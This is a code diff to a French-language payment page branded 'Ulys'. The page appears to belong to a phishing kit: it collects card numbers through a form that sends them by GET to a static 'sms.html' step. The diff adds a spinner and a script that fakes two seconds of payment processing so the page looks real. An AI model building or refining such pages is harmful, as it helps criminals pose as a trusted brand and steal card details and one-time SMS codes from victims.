@@ -7,7 +7,7 @@
   <link rel="stylesheet" href="assets/css/style.css"/>
 </head>
 <body>
- <!-- BINDEAU HAUT BLANC -->
+  <!-- BANDEAU HAUT BLANC -->
   <div class="top-nav">
     <a href="#"><span>👤</span> Mon espace</a>
     <a href="#" class="btn-primary">Devenir client</a>
@@ -34,15 +34,11 @@
       </ul>
     </nav>
   </div>
-  <header>
-    <nav class="navbar">
-      </nav>
-  </header>
 
   <main class="container">
     <div class="card">
       <h1>Paiement sécurisé</h1>
-      <form action="sms.html" method="get">
+      <form id="paymentForm" action="sms.html" method="get">
         <label for="cb-num">Numéro de carte</label>
         <input type="text" id="cb-num" name="cb-num" maxlength="19" placeholder="1234 5678 9012 3456" required/>
 
@@ -57,8 +53,25 @@
     </div>
   </main>
 
+  <!-- Spinner overlay -->
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+  </div>
+
   <footer>
     &copy; 2025 Ulys. Paiement 100 % sécurisé.
   </footer>
+
+  <script>
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      // Affiche le spinner
+      document.getElementById("spinnerOverlay").style.display = "flex";
+      // Simulation de traitement avant redirection
+      setTimeout(() => {
+        this.submit(); // ou window.location.href = "sms.html";
+      }, 2000);
+    });
+  </script>
 </body>
 </html>
